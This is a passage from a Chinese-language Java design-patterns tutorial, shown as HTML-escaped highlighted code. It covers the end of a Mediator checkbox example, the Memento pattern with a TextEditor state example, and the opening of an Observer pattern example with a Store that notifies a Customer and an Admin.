&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">checkBoxList&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forEach&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">checkBox&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">checkBox&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addChangeListener&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">onCheckBoxChanged&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">selectAll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addActionListener&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">onSelectAllClicked&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">selectNone&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addActionListener&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">onSelectNoneClicked&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">selectInverse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addActionListener&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">onSelectInverseClicked&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 当checkbox有变化时:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">onCheckBoxChanged&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ChangeEvent&lt;/span> &lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">allChecked&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">allUnchecked&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">checkBox&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">checkBoxList&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">checkBox&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isSelected&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">allUnchecked&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">allChecked&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">selectAll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setEnabled&lt;/span>&lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">allChecked&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">selectNone&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setEnabled&lt;/span>&lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">allUnchecked&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 当点击select all:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">onSelectAllClicked&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ActionEvent&lt;/span> &lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">checkBoxList&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forEach&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">checkBox&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#111">checkBox&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSelected&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">selectAll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setEnabled&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">selectNone&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setEnabled&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 当点击select none:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">onSelectNoneClicked&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ActionEvent&lt;/span> &lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">checkBoxList&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forEach&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">checkBox&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#111">checkBox&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSelected&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">selectAll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setEnabled&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">selectNone&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setEnabled&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 当点击select inverse:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">onSelectInverseClicked&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ActionEvent&lt;/span> &lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">checkBoxList&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forEach&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">checkBox&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#111">checkBox&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSelected&lt;/span>&lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">checkBox&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isSelected&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">onCheckBoxChanged&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Mediator模式经常用在有众多交互组件的UI上。为了简化UI程序，MVC模式以及MVVM模式都可以看作是Mediator模式的扩展。&lt;/p>
&lt;h3 id="备忘录memento">备忘录Memento&lt;/h3>
&lt;p>主要用于捕获一个对象的内部状态，以便在将来的某个时候恢复此状态；最简单的备忘录模式就是保存到文件，打开文件。对于文本编辑器来说，保存就是把&lt;code>TextEditor&lt;/code>类的字符串存储到文件，打开就是恢复&lt;code>TextEditor&lt;/code>类的状态。对于图像编辑器来说，原理是一样的，只是保存和恢复的数据格式比较复杂而已。Java的序列化也可以看作是备忘录模式。&lt;/p>
&lt;p>在使用文本编辑器的时候，我们还经常使用Undo、Redo这些功能。这些其实也可以用备忘录模式实现，即不定期地把&lt;code>TextEditor&lt;/code>类的字符串复制一份存起来，这样就可以Undo或Redo。&lt;/p>
&lt;p>标准的备忘录模式有这么几种角色：&lt;/p>
&lt;ul>
&lt;li>Memonto：存储的内部状态；&lt;/li>
&lt;li>Originator：创建一个备忘录并设置其状态；&lt;/li>
&lt;li>Caretaker：负责保存备忘录。&lt;/li>
&lt;/ul>
&lt;p>实际上我们在使用备忘录模式的时候，不必设计得这么复杂，只需要对类似&lt;code>TextEditor&lt;/code>的类，增加&lt;code>getState()&lt;/code>和&lt;code>setState()&lt;/code>就可以了。&lt;/p>
&lt;p>我们以一个文本编辑器&lt;code>TextEditor&lt;/code>为例，它内部使用&lt;code>StringBuilder&lt;/code>允许用户增删字符，为了支持这个&lt;code>TextEditor&lt;/code>能保存和恢复状态，我们增加&lt;code>getState()&lt;/code>和&lt;code>setState()&lt;/code>两个方法：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TextEditor&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span> &lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">ch&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ch&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">delete&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">deleteCharAt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取状态:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getState&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 恢复状态:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setState&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">state&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">delete&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">state&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对这个简单的文本编辑器，用一个&lt;code>String&lt;/code>就可以表示其状态，对于复杂的对象模型，通常我们会使用JSON、XML等复杂格式。&lt;/p>
&lt;h3 id="观察者observer发布-订阅publish-subscribe">观察者Observer/发布-订阅Publish-Subscribe&lt;/h3>
&lt;p>它是一种通知机制，让发送通知的一方（被观察方）和接收通知的一方（观察者）能彼此分离，互不影响，当一个对象的状态发生改变时，所有依赖于它的对象都得到通知并被自动更新&lt;/p>
&lt;p>举例：假设一个电商网站，有多种&lt;code>Product&lt;/code>（商品），同时，&lt;code>Customer&lt;/code>（消费者）和&lt;code>Admin&lt;/code>（管理员）对商品上架、价格改变都感兴趣，希望能第一时间获得通知。于是，&lt;code>Store&lt;/code>（商场）可以这么写：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Store&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Customer&lt;/span> &lt;span style="color:#111">customer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Admin&lt;/span> &lt;span style="color:#111">admin&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Product&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">products&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">addNewProduct&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">double&lt;/span> &lt;span style="color:#111">price&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Product&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Product&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">price&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">products&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 通知用户:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">customer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">onPublished&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 通知管理员:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">admin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">onPublished&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setProductPrice&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">double&lt;/span> &lt;span style="color:#111">price&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Product&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">products&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setPrice&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">price&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 通知用户:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">customer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">onPriceChanged&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 通知管理员:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">admin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">onPriceChanged&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
